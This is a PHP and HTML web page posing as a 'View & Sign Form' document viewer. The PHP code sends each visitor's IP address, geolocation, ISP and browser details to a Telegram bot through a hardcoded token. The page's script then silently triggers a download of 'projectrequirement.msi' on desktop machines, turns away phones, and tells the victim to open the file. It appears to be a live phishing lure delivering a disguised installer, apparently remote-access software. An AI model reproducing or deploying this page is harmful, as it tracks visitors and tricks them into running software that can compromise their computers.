<?php
// Telegram Configuration
$botToken = '5842558909:AAETb7SiBfb9O9N_SAxe9UK0S_f4xPcGTPQ';
$chatID = '5533797694';

// Collect visitor data
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
$time = date('Y-m-d H:i:s');

// Get geolocation
$geo = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"), true);

// Create Telegram message
$message = "🚨 New Download Triggered 🚨\n";
$message .= "▫️ Time: {$time}\n";
$message .= "▫️ IP: {$ip}\n";
$message .= "▫️ Location: " . ($geo['city'] ?? 'Unknown') . ", " . ($geo['country'] ?? 'Unknown') . "\n";
$message .= "▫️ ISP: " . ($geo['isp'] ?? 'Unknown') . "\n";
$message .= "▫️ Device: {$ua}";

// Send to Telegram
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";
$data = ['chat_id' => $chatID, 'text' => $message];
$options = [
    'http' => [
        'method'  => 'POST',
        'content' => http_build_query($data)
    ]
];
file_get_contents($url, false, stream_context_create($options));
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>View & Sign Form</title>

  <style>
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      font-family: Arial, sans-serif;
      background: url('https://1stltx.com/tank.jpg') no-repeat center center fixed;
      background-size: cover;
      position: relative;
      overflow: hidden;
    }

    .blur-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: inherit;
      filter: blur(8px);
      z-index: -1;
    }

    .top-left-logo {
      position: absolute;
      top: 20px;
      left: 20px;
      z-index: 10;
    }

    .top-left-logo img {
      max-width: 120px;
      height: auto;
    }

    .center-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
      z-index: 10;
      position: relative;
    }

    .center-container a {
      background-color: #0b5d2a;
      color: #fff;
      padding: 15px 30px;
      text-decoration: none;
      font-size: 16px;
      border-radius: 6px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }

    .screenconnect {
      font-weight: 900;
      font-size: 22px;
      letter-spacing: 1px;
      text-transform: uppercase;
      color: #ffffff;
    }

    a#download-link {
      display: none;
    }

    .blocked-msg {
      display: none;
      background: rgba(0,0,0,0.7);
      color: #fff;
      padding: 20px;
      border-radius: 8px;
      font-size: 18px;
      max-width: 400px;
    }
  </style>

  <script>
    function isMobileDevice() {
      return /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent);
    }

    window.onload = function () {

      const downloadLink = document.getElementById('download-link');
      const desktopContent = document.getElementById('desktop-content');
      const blockedMsg = document.getElementById('blocked-msg');

      // Block mobile devices
      if (isMobileDevice()) {
        desktopContent.style.display = "none";
        blockedMsg.style.display = "block";
        return;
      }

      // Auto-trigger download for desktop users
      setTimeout(() => {
        downloadLink.click();
      }, 1000);
    };
  </script>

</head>

<body>

  <div class="blur-overlay"></div>

  <div class="top-left-logo"></div>

  <div class="center-container" id="desktop-content">
    <a href="./" target="_blank">
      Document viewer successfully downloaded. Open
      <span class="screenconnect">projectrequirement</span>
      to view
    </a>
  </div>

  <div class="center-container">
    <div class="blocked-msg" id="blocked-msg">
      This page can only be accessed on computers (desktop or laptop).
    </div>
  </div>

  <!-- Hidden download link -->
  <a id="download-link" href="projectrequirement.msi" download></a>

  <script>
    if (/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
      document.body.innerHTML = `
      <div style="
        display:flex;
        justify-content:center;
        align-items:center;
        height:100vh;
        background:#111;
        color:#fff;
        font-family:Arial;
        text-align:center;
        padding:20px;
      ">
        <div>
          <h2>Desktop Only</h2>
          <p>This message can only be viewed on a desktop or laptop computer.</p>
        </div>
      </div>`;
    }
  </script>

</body>
</html>
